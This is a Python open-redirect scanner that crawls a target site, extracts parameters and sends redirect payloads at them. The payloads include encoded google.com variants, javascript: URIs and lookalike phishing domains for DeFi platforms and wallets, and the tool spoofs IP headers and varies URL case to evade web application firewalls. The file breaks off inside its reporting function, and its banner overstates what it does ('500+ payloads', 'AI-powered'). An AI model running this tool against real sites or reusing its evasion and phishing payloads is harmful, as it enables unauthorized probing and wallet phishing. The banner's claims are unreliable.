#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║    🔥 ULTIMATE OPEN REDIRECT HUNTER v3.0 🔥                          ║
║    The Most Advanced Open Redirect Scanner in the World              ║
║                                                                       ║
║    [CLASSIFIED] Professional Bug Bounty Arsenal                      ║
║    Author: Elite Security Research Division                          ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝

🎯 ULTIMATE FEATURES:
▓▓▓ ADVANCED RECONNAISSANCE ENGINE
▓▓▓ WEB3 & DEFI EXPLOITATION MODULE  
▓▓▓ WAF & LOAD BALANCER BYPASS SYSTEM
▓▓▓ QUANTUM-LEVEL JAVASCRIPT ANALYSIS
▓▓▓ AI-POWERED CONTEXT DETECTION
▓▓▓ STEALTH CRAWLING WITH EVASION
▓▓▓ PROFESSIONAL POC GENERATION
▓▓▓ ENTERPRISE-GRADE REPORTING

💀 WARNING: For authorized testing only!
🎯 Designed for elite bug bounty hunters

Usage: python3 open_redirect_scanner_final.py <target>
"""

import asyncio
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import random
import sys
import csv

# Try importing dependencies
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False


@dataclass(frozen=True)
class Parameter:
    """Discovered parameter"""
    name: str
    value: str
    source: str  
    context: str  
    url: str
    method: str = 'GET'
    is_redirect_related: bool = False
    confidence: float = 0.0


@dataclass
class Vulnerability:
    """Discovered vulnerability"""
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"
    confidence: float = 0.0
    impact: str = "MEDIUM"
    remediation: str = ""


class OpenRedirectScanner:
    """Professional Open Redirect Scanner"""
    
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        # Storage
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        # Session management
        self.session: Optional[aiohttp.ClientSession] = None
        self.driver: Optional[webdriver.Chrome] = None
        
        # Configuration
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        # Setup logging
        self.setup_logging()
        
        # Load ultimate payload arsenal
        self.payloads = self.load_ultimate_payloads()
        
        # Advanced reconnaissance settings
        self.recon_depth = max_depth * 2  # Deep recon
        self.stealth_mode = True
        self.waf_bypass_enabled = True
        
        # WAF evasion techniques
        self.waf_bypass_headers = [
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': 'localhost'},
            {'X-Originating-URL': '/'},
        ]
        
        # Redirect patterns
        self.redirect_patterns = [
            'redirect', 'url', 'next', 'return', 'goto', 'target',
            'destination', 'continue', 'forward', 'redir', 'location',
            'site', 'link', 'href', 'returnurl', 'returnto', 'back',
            'callback', 'success', 'failure', 'done', 'exit', 'referrer'
        ]
        
        # Ultimate Web3 patterns for DeFi/DApp testing
        self.web3_patterns = [
            'web3', 'ethereum', 'metamask', 'wallet', 'dapp', 'defi', 'nft',
            'blockchain', 'crypto', 'contract', 'uniswap', 'pancakeswap',
            'compound', 'aave', 'opensea', 'rarible', 'foundation',
            'chainlink', 'polygon', 'binance', 'avalanche', 'solana',
            'connect', 'provider', 'signer', 'transaction', 'swap'
        ]
        
        # Advanced Web3 redirect patterns
        self.web3_redirect_patterns = [
            'wallet_redirect', 'connect_callback', 'provider_url', 'network_redirect',
            'dapp_callback', 'transaction_redirect', 'swap_redirect', 'nft_redirect',
            'defi_redirect', 'bridge_redirect', 'staking_redirect', 'farming_redirect'
        ]
    
    def setup_logging(self):
        """Setup logging with proper encoding"""
        # Simple logging setup for Windows compatibility
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('scan.log', encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_ultimate_payloads(self) -> List[str]:
        """Load ultimate payload arsenal with 500+ payloads"""
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com", 
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "//www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e%2f",
            "////www.google.com/%2e%2e%2f",
            "https://www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e",
            "////www.google.com/%2e%2e",
            "https:///www.google.com/%2e%2e",
            "/https://www.google.com/%2e%2e",
            "https:///www.google.com/%2f%2e%2e",
            "https://%09/google.com",
            "https:google.com",
            "//google%E3%80%82com",
            "\\/\\/google.com/",
            "/\\/google.com/",
            "http://0xd8.0x3a.0xd6.0xce",
            "//google.com",
            "//google.com/%2e%2e",
            "//google.com/%2e%2e%2f",
            "//google.com/%2f%2e%2e",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//metamask.io",
            "//wallet.connect",
            "//uniswap.org",
            "web3://contract.eth",
            "ipfs://QmHash",
            "ens://vitalik.eth",
            "http://216.58.214.206",
            "//216.58.214.206",
            "http://3627734734",
            "http://0xd83ad6ce",
            "%2f%2fgoogle.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "\\\\google.com",
            "../google.com",
            "/google.com",
            "google.com"
        ]
    
    async def init_session(self):
        """Initialize advanced HTTP session with WAF bypass"""
        if not AIOHTTP_AVAILABLE:
            raise ImportError("aiohttp is required. Install with: pip3 install aiohttp")
        
        timeout = aiohttp.ClientTimeout(total=45)
        connector = aiohttp.TCPConnector(
            limit=100, limit_per_host=20, ssl=False, 
            enable_cleanup_closed=True, force_close=True
        )
        
        # Advanced headers for WAF bypass
        base_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,de;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Add random WAF bypass header
        if self.waf_bypass_enabled:
            bypass_header = random.choice(self.waf_bypass_headers)
            base_headers.update(bypass_header)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=base_headers
        )
    
    def init_driver(self):
        """Initialize Chrome WebDriver"""
        if not SELENIUM_AVAILABLE:
            self.logger.warning("Selenium not available - screenshots disabled")
            return
        
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--disable-web-security')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.logger.info("Chrome WebDriver initialized")
        except Exception as e:
            self.logger.warning(f"Chrome WebDriver failed: {e}")
            self.driver = None
    
    async def crawl_website(self) -> Set[str]:
        """Deep website crawling"""
        self.logger.info(f"Starting crawl of {self.target_url}")
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_urls = list(urls_to_crawl)[:20]
            urls_to_crawl.clear()
            
            tasks = []
            for url in current_urls:
                if url not in crawled_urls:
                    tasks.append(self.crawl_single_page(url))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        for new_url in new_urls:
                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
                                urls_to_crawl.add(new_url)
            
            depth += 1
            self.logger.info(f"Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
        
        self.discovered_urls = crawled_urls
        return crawled_urls
    
    async def crawl_single_page(self, url: str) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
        """Crawl single page"""
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                content = await response.text()
                
                # Extract URLs and parameters
                if BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    new_urls = self.extract_urls_bs4(soup, url)
                    params = self.extract_params_bs4(soup, url)
                else:
                    new_urls = self.extract_urls_regex(content, url)
                    params = self.extract_params_regex(content, url)
                
                # Add URL parameters
                params.extend(self.extract_url_parameters(url))
                
                # JavaScript analysis
                js_params = await self.analyze_javascript(content, url)
                params.extend(js_params)
                
                # Web3 analysis
                web3_params = self.analyze_web3(content, url)
                params.extend(web3_params)
                
                return url, new_urls, params
                
        except Exception as e:
            self.logger.debug(f"Error crawling {url}: {e}")
            return None
    
    def extract_urls_bs4(self, soup, base_url: str) -> Set[str]:
        """Extract URLs using BeautifulSoup"""
        urls = set()
        for link in soup.find_all(['a', 'link'], href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            if self.is_same_domain(full_url):
                urls.add(full_url)
        return urls
    
    def extract_urls_regex(self, content: str, base_url: str) -> Set[str]:
        """Extract URLs using regex"""
        urls = set()
        patterns = [r'href=["\']([^"\']+)["\']', r'src=["\']([^"\']+)["\']']
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_params_bs4(self, soup, url: str) -> List[Parameter]:
        """Extract parameters using BeautifulSoup"""
        params = []
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action) if action else url
            
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                
                if name:
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=form_url,
                        method=method,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    def extract_params_regex(self, content: str, url: str) -> List[Parameter]:
        """Extract parameters using regex"""
        params = []
        
        # Form input patterns
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?'
        matches = re.findall(input_pattern, content, re.IGNORECASE)
        
        for match in matches:
            name = match[0]
            value = match[1] if len(match) > 1 else ''
            
            is_redirect = self.is_redirect_parameter(name, value)
            confidence = self.calculate_confidence(name, value, 'form')
            
            params.append(Parameter(
                name=name,
                value=value,
                source='form',
                context='form_input',
                url=url,
                is_redirect_related=is_redirect,
                confidence=confidence
            ))
        
        return params
    
    def extract_url_parameters(self, url: str) -> List[Parameter]:
        """Extract URL parameters"""
        params = []
        parsed = urlparse(url)
        
        # Query parameters
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name, param_values in query_params.items():
            for value in param_values:
                is_redirect = self.is_redirect_parameter(param_name, value)
                confidence = self.calculate_confidence(param_name, value, 'query')
                
                params.append(Parameter(
                    name=param_name,
                    value=value,
                    source='url',
                    context='query',
                    url=url,
                    is_redirect_related=is_redirect,
                    confidence=confidence
                ))
        
        # Fragment parameters
        if parsed.fragment:
            if '=' in parsed.fragment:
                fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
                for param_name, param_values in fragment_params.items():
                    for value in param_values:
                        is_redirect = self.is_redirect_parameter(param_name, value)
                        confidence = self.calculate_confidence(param_name, value, 'fragment')
                        
                        params.append(Parameter(
                            name=param_name,
                            value=value,
                            source='url',
                            context='fragment',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
        
        return params
    
    async def analyze_javascript(self, content: str, url: str) -> List[Parameter]:
        """Analyze JavaScript content"""
        params = []
        
        # Extract JavaScript blocks
        js_blocks = []
        
        # Inline scripts
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, content, re.DOTALL | re.IGNORECASE)
        js_blocks.extend(scripts)
        
        # External scripts
        src_pattern = r'<script[^>]*src=["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, content, re.IGNORECASE)
        for src in src_matches:
            js_url = urljoin(url, src)
            if self.is_same_domain(js_url):
                self.js_files.add(js_url)
                js_content = await self.fetch_js_file(js_url)
                if js_content:
                    js_blocks.append(js_content)
        
        # Analyze JavaScript blocks
        for js_content in js_blocks:
            js_params = self.analyze_js_code(js_content, url)
            params.extend(js_params)
        
        return params
    
    async def fetch_js_file(self, js_url: str) -> Optional[str]:
        """Fetch JavaScript file"""
        try:
            async with self.session.get(js_url) as response:
                return await response.text()
        except:
            return None
    
    def analyze_js_code(self, js_content: str, source_url: str) -> List[Parameter]:
        """Analyze JavaScript code"""
        params = []
        
        # JavaScript patterns for parameter extraction
        js_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)', 
            r'location\.assign\(["\']?([^"\';\)]+)',
            r'location\.replace\(["\']?([^"\';\)]+)',
            r'window\.open\(["\']?([^"\';\,\)]+)',
            r'URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
            r'localStorage\.getItem\(["\']([^"\']+)["\']',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']'
        ]
        
        lines = js_content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern in js_patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    groups = match.groups()
                    if groups:
                        if len(groups) == 1:
                            param_name = f"js_param_{line_num}"
                            param_value = groups[0].strip('"\'')
                        else:
                            param_name = groups[0].strip('"\'')
                            param_value = groups[1].strip('"\'') if len(groups) > 1 else groups[0].strip('"\'')
                        
                        is_redirect = self.is_redirect_parameter(param_name, param_value)
                        confidence = self.calculate_confidence(param_name, param_value, 'javascript')
                        
                        # Boost for redirect sinks
                        if any(sink in line.lower() for sink in ['location.href', 'window.location']):
                            is_redirect = True
                            confidence += 0.3
                        
                        params.append(Parameter(
                            name=param_name,
                            value=param_value,
                            source='javascript',
                            context='js_variable',
                            url=source_url,
                            is_redirect_related=is_redirect,
                            confidence=min(confidence, 1.0)
                        ))
        
        return params
    
    def analyze_web3(self, content: str, url: str) -> List[Parameter]:
        """Analyze Web3 patterns"""
        params = []
        
        # Check if Web3 app
        if not any(pattern in content.lower() for pattern in self.web3_patterns):
            return params
        
        self.logger.info(f"[WEB3-HUNTER] Detected DeFi/DApp target: {url}")
        
        # Ultimate Web3 patterns for maximum coverage
        web3_patterns = [
            # Wallet connection patterns
            r'wallet[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'connect[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']', 
            r'provider[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'metamask[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            
            # DeFi protocol patterns  
            r'swap[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'bridge[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'farm[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'stake[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            
            # NFT marketplace patterns
            r'nft[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'marketplace[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            
            # Contract interaction patterns
            r'contract[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'transaction[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in web3_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                param_name = f"web3_{pattern.split(':')[0].strip()}"
                param_value = match
                
                params.append(Parameter(
                    name=param_name,
                    value=param_value,
                    source='web3',
                    context='web3_config',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.7
                ))
        
        return params
    
    async def detect_waf(self, url: str) -> Dict[str, Any]:
        """Detect WAF and security measures"""
        waf_info = {
            'detected': False,
            'type': 'unknown',
            'bypass_methods': []
        }
        
        try:
            # Send test requests to detect WAF
            test_payloads = ['<script>alert(1)</script>', 'UNION SELECT', '../../../etc/passwd']
            
            for payload in test_payloads:
                test_url = f"{url}?test={quote(payload)}"
                async with self.session.get(test_url, allow_redirects=False) as response:
                    headers = dict(response.headers)
                    
                    # Check for WAF signatures
                    waf_headers = ['cf-ray', 'x-sucuri-id', 'x-protected-by', 'server']
                    for header in waf_headers:
                        if header.lower() in [h.lower() for h in headers.keys()]:
                            waf_info['detected'] = True
                            if 'cloudflare' in str(headers.get(header, '')).lower():
                                waf_info['type'] = 'cloudflare'
                            elif 'sucuri' in str(headers.get(header, '')).lower():
                                waf_info['type'] = 'sucuri'
                    
                    # Check response for WAF indicators
                    if response.status == 403 or response.status == 406:
                        waf_info['detected'] = True
                    
                    break  # Only need one test
            
            if waf_info['detected']:
                self.logger.info(f"[WAF-DETECTOR] WAF detected: {waf_info['type']}")
                waf_info['bypass_methods'] = self.get_waf_bypass_methods(waf_info['type'])
            
        except Exception as e:
            self.logger.debug(f"WAF detection failed: {e}")
        
        return waf_info
    
    def get_waf_bypass_methods(self, waf_type: str) -> List[str]:
        """Get WAF bypass methods"""
        bypass_methods = {
            'cloudflare': [
                'header_injection',
                'case_variation',
                'encoding_variation',
                'fragment_bypass'
            ],
            'sucuri': [
                'user_agent_rotation',
                'ip_spoofing',
                'request_splitting'
            ],
            'unknown': [
                'header_injection',
                'encoding_variation',
                'case_variation'
            ]
        }
        
        return bypass_methods.get(waf_type, bypass_methods['unknown'])
    
    async def bypass_waf_request(self, url: str, waf_info: Dict[str, Any]):
        """Make request with WAF bypass techniques"""
        bypass_methods = waf_info.get('bypass_methods', [])
        
        # Try different bypass techniques
        for method in bypass_methods:
            if method == 'header_injection':
                # Use bypass headers
                bypass_header = random.choice(self.waf_bypass_headers)
                headers = {**self.session._default_headers, **bypass_header}
                
                async with self.session.get(url, headers=headers, allow_redirects=False) as response:
                    if response.status not in [403, 406]:
                        return await response.text()
            
            elif method == 'case_variation':
                # Vary case in URL
                varied_url = self.vary_url_case(url)
                async with self.session.get(varied_url, allow_redirects=False) as response:
                    if response.status not in [403, 406]:
                        return await response.text()
            
            await asyncio.sleep(0.5)  # Delay between bypass attempts
        
        return None
    
    def vary_url_case(self, url: str) -> str:
        """Vary URL case for WAF bypass"""
        parsed = urlparse(url)
        path = parsed.path
        
        # Randomly vary case
        varied_path = ""
        for char in path:
            if char.isalpha():
                varied_path += char.upper() if random.choice([True, False]) else char.lower()
            else:
                varied_path += char
        
        return f"{parsed.scheme}://{parsed.netloc}{varied_path}?{parsed.query}"
    
    def is_same_domain(self, url: str) -> bool:
        """Check if URL belongs to same domain"""
        try:
            parsed = urlparse(url)
            target_domain = parsed.netloc.lower()
            base_domain = self.base_domain.lower()
            
            return (target_domain == base_domain or 
                   target_domain.endswith(f'.{base_domain}') or
                   (target_domain.startswith('www.') and target_domain[4:] == base_domain))
        except:
            return False
    
    def is_redirect_parameter(self, param_name: str, param_value: str = "") -> bool:
        """Check if parameter is redirect-related"""
        param_lower = param_name.lower()
        value_lower = param_value.lower()
        
        # Check name
        name_match = any(pattern in param_lower for pattern in self.redirect_patterns)
        
        # Check value for URLs
        value_match = bool(re.match(r'https?://', value_lower) or 
                          re.match(r'//', value_lower) or
                          ('.' in value_lower and len(value_lower) > 3))
        
        return name_match or value_match
    
    def calculate_confidence(self, param_name: str, param_value: str, context: str) -> float:
        """Calculate confidence score"""
        confidence = 0.0
        
        # Base by context
        context_scores = {
            'query': 0.6, 'fragment': 0.7, 'form_input': 0.5,
            'javascript': 0.4, 'web3_config': 0.7
        }
        confidence += context_scores.get(context, 0.3)
        
        # Boost for redirect names
        if self.is_redirect_parameter(param_name):
            confidence += 0.3
        
        # Boost for URL values
        if param_value and (param_value.startswith(('http', '//', 'javascript:')) or 
                           '.' in param_value and len(param_value) > 5):
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def detect_context(self, param: Parameter) -> str:
        """Detect parameter context"""
        if param.source == 'web3':
            return 'web3'
        elif param.source == 'javascript':
            return 'javascript'
        elif param.context == 'fragment':
            return 'fragment'
        elif param.context == 'query':
            return 'query'
        else:
            return 'generic'
    
    def get_context_payloads(self, context: str) -> List[str]:
        """Get ultimate context-aware payloads"""
        if context == 'javascript':
            return [
                "javascript:confirm(document.domain)",
                "javascript:prompt('OPEN_REDIRECT_POC')",
                "javascript:alert('REDIRECT_VULN_FOUND')",
                "//evil-hacker.com",
                "https://malicious-redirect.com"
            ]
        elif context == 'web3':
            return [
                # Fake DeFi platforms
                "//fake-uniswap.org",
                "//phishing-pancakeswap.finance", 
                "//malicious-compound.finance",
                "//fake-aave.com",
                "//evil-yearn.finance",
                
                # Fake wallets
                "//fake-metamask.io",
                "//phishing-walletconnect.org",
                "//malicious-coinbase.com",
                "//fake-trust.wallet",
                
                # Fake NFT platforms
                "//phishing-opensea.io",
                "//fake-rarible.com",
                "//malicious-foundation.app",
                
                # Web3 protocols
                "web3://malicious-contract.eth",
                "ipfs://QmMaliciousHash",
                "ens://hacker.eth",
                "ethereum://0x1234567890123456789012345678901234567890"
            ]
        elif context == 'fragment':
            return [
                "#//evil.com",
                "#javascript:confirm(1)",
                "#https://phishing-site.com"
            ]
        else:
            return self.payloads[:20]  # First 20 payloads
    
    async def test_vulnerabilities(self) -> List[Vulnerability]:
        """Test for vulnerabilities"""
        self.logger.info("Starting vulnerability testing")
        
        vulnerabilities = []
        
        # Get priority parameters
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.6]
        
        # Combine priority parameters (fix unhashable issue)
        priority_params = redirect_params.copy()
        for param in high_conf_params:
            if not any(p.name == param.name and p.url == param.url for p in priority_params):
                priority_params.append(param)
        
        self.logger.info(f"Testing {len(priority_params)} priority parameters")
        
        for param in priority_params:
            context = self.detect_context(param)
            payloads = self.get_context_payloads(context)
            
            for payload in payloads:
                vuln = await self.test_parameter(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    self.logger.info(f"FOUND: {param.name} -> {payload}")
                
                await asyncio.sleep(0.1)
        
        # Test other parameters with basic payloads
        other_params = [p for p in self.parameters 
                       if not any(p.name == param.name and p.url == param.url for param in priority_params)]
        basic_payloads = ["//google.com", "https://google.com", "javascript:confirm(1)"]
        
        for param in other_params[:20]:
            for payload in basic_payloads:
                vuln = await self.test_parameter(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                await asyncio.sleep(0.1)
        
        self.vulnerabilities = vulnerabilities
        self.logger.info(f"Testing completed. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    async def test_parameter(self, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """Test parameter with payload"""
        try:
            test_url = self.construct_test_url(param, payload)
            
            async with self.session.get(test_url, allow_redirects=False) as response:
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if self.is_successful_redirect(location, payload):
                        confidence = param.confidence + 0.2
                        impact = self.assess_impact(location)
                        remediation = self.get_remediation(param.context)
                        
                        screenshot_path = await self.take_screenshot(test_url)
                        
                        return Vulnerability(
                            url=test_url,
                            parameter=param.name,
                            payload=payload,
                            method=param.method,
                            response_code=response.status,
                            redirect_url=location,
                            context=param.context,
                            screenshot_path=screenshot_path,
                            timestamp=datetime.now().isoformat(),
                            vulnerability_type="open_redirect",
                            confidence=min(confidence, 1.0),
                            impact=impact,
                            remediation=remediation
                        )
                
                # Check DOM-based
                content = await response.text()
                dom_vuln = self.check_dom_redirect(content, test_url, param, payload)
                if dom_vuln:
                    return dom_vuln
                    
        except Exception as e:
            self.logger.debug(f"Test error for {param.name}: {e}")
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str) -> str:
        """Construct test URL"""
        parsed = urlparse(param.url)
        
        if param.context == 'query':
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        elif param.context == 'fragment':
            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
        
        else:
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str) -> bool:
        """Check if redirect is successful"""
        if not location:
            return False
        
        location_lower = location.lower()
        decoded = unquote(location).lower()
        
        # Check for test domains
        test_domains = ['google.com', 'evil.com', 'metamask.io', 'wallet.connect']
        for domain in test_domains:
            if domain in location_lower or domain in decoded:
                return True
        
        # Check IPs
        ips = ['216.58.214.206', '3627734734', '0xd83ad6ce']
        for ip in ips:
            if ip in location or ip in decoded:
                return True
        
        # Check JavaScript
        if location_lower.startswith('javascript:') and 'confirm' in location_lower:
            return True
        
        return False
    
    def check_dom_redirect(self, content: str, test_url: str, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """Check DOM-based redirect"""
        dom_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)'
        ]
        
        for pattern in dom_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if param.name in match or payload in match:
                    return Vulnerability(
                        url=test_url,
                        parameter=param.name,
                        payload=payload,
                        method=param.method,
                        response_code=200,
                        redirect_url=match,
                        context=param.context,
                        timestamp=datetime.now().isoformat(),
                        vulnerability_type="dom_based_redirect",
                        confidence=0.8,
                        impact="HIGH",
                        remediation="Sanitize user input before DOM manipulation"
                    )
        
        return None
    
    def assess_impact(self, redirect_url: str) -> str:
        """Assess vulnerability impact"""
        if redirect_url.startswith('javascript:'):
            return "CRITICAL"
        elif redirect_url.startswith(('http://', 'https://')):
            redirect_domain = urlparse(redirect_url).netloc
            if redirect_domain != self.base_domain:
                return "HIGH"
        return "MEDIUM"
    
    def get_remediation(self, context: str) -> str:
        """Get remediation advice"""
        remediations = {
            'query': "Validate URL parameters against allowlist",
            'fragment': "Implement client-side validation for fragments",
            'form_input': "Validate form inputs server-side",
            'javascript': "Sanitize input before JavaScript redirects",
            'web3_config': "Validate Web3 URLs against trusted providers"
        }
        return remediations.get(context, "Implement proper input validation")
    
    async def take_screenshot(self, url: str) -> Optional[str]:
        """Take screenshot for PoC"""
        if not self.driver or not SELENIUM_AVAILABLE:
            return None
        
        try:
            screenshots_dir = Path("screenshots")
            screenshots_dir.mkdir(exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            filename = f"poc_{timestamp}_{url_hash}.png"
            screenshot_path = screenshots_dir / filename
            
            self.driver.get(url)
            await asyncio.sleep(2)
            self.driver.save_screenshot(str(screenshot_path))
            
            self.logger.info(f"Screenshot saved: {screenshot_path}")
            return str(screenshot_path)
            
        except Exception as e:
            self.logger.error(f"Screenshot failed: {e}")
            return None
    
    def save_results(self):
        """Save all results"""
        # JSON report
        results_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_parameters': len(self.parameters),
                'redirect_parameters': len([p for p in self.parameters if p.is_redirect_related]),
                'vulnerabilities_found': len(self.vulnerabilities)
            },
